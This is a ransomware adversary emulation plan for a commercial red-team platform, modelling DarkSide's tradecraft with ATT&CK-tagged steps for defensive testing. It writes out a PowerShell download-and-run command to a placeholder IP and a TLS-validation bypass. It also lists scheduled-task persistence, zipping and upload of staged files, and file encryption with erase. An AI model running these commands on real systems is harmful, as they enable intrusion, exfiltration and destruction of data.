# DarkSide Ransomware Adversary Emulation Plan

This threat was posted after the Colonial Pipeline ransomware attack on May 7, 2021. It is explained further in SCYTHE's Threat Thursday blog: https://www.scythe.io/library/threatthursday-darkside-ransomware

This threat is based on Cybereason's Cyber Threat Intelligence from April 2021: https://www.cybereason.com/blog/cybereason-vs-darkside-ransomware

To emulate:
1. Download and import the threat in JSON format to your SCYTHE instance - https://raw.githubusercontent.com/scythe-io/community-threats/master/DarkSide/DarkSide_scythe_threat.json
2. Download the Virtual File System (VFS) files under DarkSide/VFS
3. Upload the VFS files to your SCYTHE VFS in the following location: VFS:/shared/threats/DarkSide
4. Ensure HTTP Relay is running on your SCYTHE server.
5. Create a new campaign, selecting HTTP, and ensuring the communication options match your HTTP Relay. Consider using a "naked IP address" instead of a domain to more closely emulate this attack.
6. Import from Existing Threat: DarkSide
7. Launch Campaign
8. Click More Actions and copy the URL for the desired EXE. 
9. In the target system, run this PowerShell command with the respective URL to download the payload as documented in the CTI: powershell -Command "(New-Object Net.WebClient).DownloadFile('http://0.0.0.0/ServiceLogin123','C:\Users\Public\update.exe')"
10. Execute update.exe

Note that SCYTHE forces HTTPS for operational security. Using an IP will result in a HTTPS certificate validation issue. To get around that:
- Open a PowerShell command prompt
- [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
- (New-Object Net.WebClient).DownloadFile('http://0.0.0.0/ServiceLogin123','C:\Users\Public\update.exe')
- C:\Users\Public\update.exe


 #Attack Graph
```mermaid
graph TD
Step0["<b> module: https </b> <br>"]
Step1["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load run </i> <br>"]
Step2["<b> module: run </b> <br><h4> parameters: </h4> <i> reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Nls\Language </i> <br><a href='https://attack.mitre.org/techniques/T1012'>att&ck-technique:T1012</a><br>
"]
Step3[""]
Step4["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load sysinfo </i> <br>"]
Step5["<b> module: sysinfo </b> <br><h4> parameters: </h4> <i>  </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1082'>att&ck-technique:T1082</a><br>
"]
Step6["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load processes </i> <br>"]
Step7["<b> module: processes </b> <br><h4> parameters: </h4> <i>  </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1057'>att&ck-technique:T1057</a><br>
"]
Step8["<b> module: run </b> <br><h4> parameters: </h4> <i> whoami </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1033'>att&ck-technique:T1033</a><br>
"]
Step9["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c SCHTASKS /CREATE /SC DAILY /TN MyTasks\Task1 /TR C:\update.exe /ST 11:00 /F </i> <br><a href='https://attack.mitre.org/techniques/T1053'>att&ck-technique:T1053</a><br>
"]
Step10["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c SCHTASKS /QUERY /TN MyTasks\Task1 </i> <br><a href='https://attack.mitre.org/techniques/T1053.005'>att&ck-technique:T1053.005</a><br>
"]
Step11["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load crypt </i> <br>"]
Step12["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load downloader </i> <br>"]
Step13["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load file </i> <br>"]
Step14["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load uploader </i> <br>"]
Step15["<b> module: run </b> <br><h4> parameters: </h4> <i> powershell mkdir %USERPROFILE%\Desktop\DarkSide </i> <br><a href='https://attack.mitre.org/techniques/T1074'>att&ck-technique:T1074</a><br>
"]
Step16["<b> module: file </b> <br><h4> parameters: </h4> <i> --create --path %USERPROFILE%\Desktop\DarkSide\target_file.xls --size 5MB --count 10 --random </i> <br>"]
Step17["<b> module: run </b> <br><h4> parameters: </h4> <i> powershell Compress-Archive -Path $env:userprofile\Desktop\DarkSide -CompressionLevel Optimal -Destination $env:userprofile\Desktop\exfil.zip </i> <br><a href='https://attack.mitre.org/techniques/T1074.001'>att&ck-technique:T1074.001</a><br>
"]
Step18["<b> module: uploader </b> <br><h4> parameters: </h4> <i> --remotepath %USERPROFILE%\Desktop\exfil.zip </i> <br><a href='https://attack.mitre.org/techniques/T1041'>att&ck-technique:T1041</a><br>
"]
Step19["<b> module: crypt </b> <br><h4> parameters: </h4> <i> --target %USERPROFILE%\Desktop\DarkSide\ --encrypt --password h3ll0w0rld --erase </i> <br><a href='https://attack.mitre.org/techniques/T1486'>att&ck-technique:T1486</a><br>
"]
Step20["<b> module: downloader </b> <br><h4> parameters: </h4> <i> --src VFS:/shared/threats/DarkSide/README.txt --dest %USERPROFILE%\Desktop\README.txt </i> <br><a href='https://attack.mitre.org/techniques/T1491.001'>att&ck-technique:T1491.001</a><br>
"]
Step21["<b> module: controller </b> <br><h4> parameters: </h4> <i> --integrity </i> <br>"]
Step22[""]
Step23["<b> module: run </b> <br><h4> parameters: </h4> <i> powershell Get-WmiObject Win32_Shadowcopy </i> <br><a href='https://attack.mitre.org/techniques/T1490'>att&ck-technique:T1490</a><br>
"]
Step24[""]
Step25["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c SCHTASKS /DELETE /TN MyTasks\Task1 /F </i> <br><a href='https://attack.mitre.org/techniques/T1053.005'>att&ck-technique:T1053.005</a><br>
"]
Step26["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c rmdir /Q /S %USERPROFILE%\Desktop\DarkSide </i> <br>"]
Step0 --> Step1
Step1 --> Step2
Step2 --> Step3
Step3 --> Step4
Step4 --> Step5
Step5 --> Step6
Step6 --> Step7
Step7 --> Step8
Step8 --> Step9
Step9 --> Step10
Step10 --> Step11
Step11 --> Step12
Step12 --> Step13
Step13 --> Step14
Step14 --> Step15
Step15 --> Step16
Step16 --> Step17
Step17 --> Step18
Step18 --> Step19
Step19 --> Step20
Step20 --> Step21
Step21 --> Step22
Step22 --> Step23
Step23 --> Step24
Step24 --> Step25
Step25 --> Step26
Step26 --> Step27
```
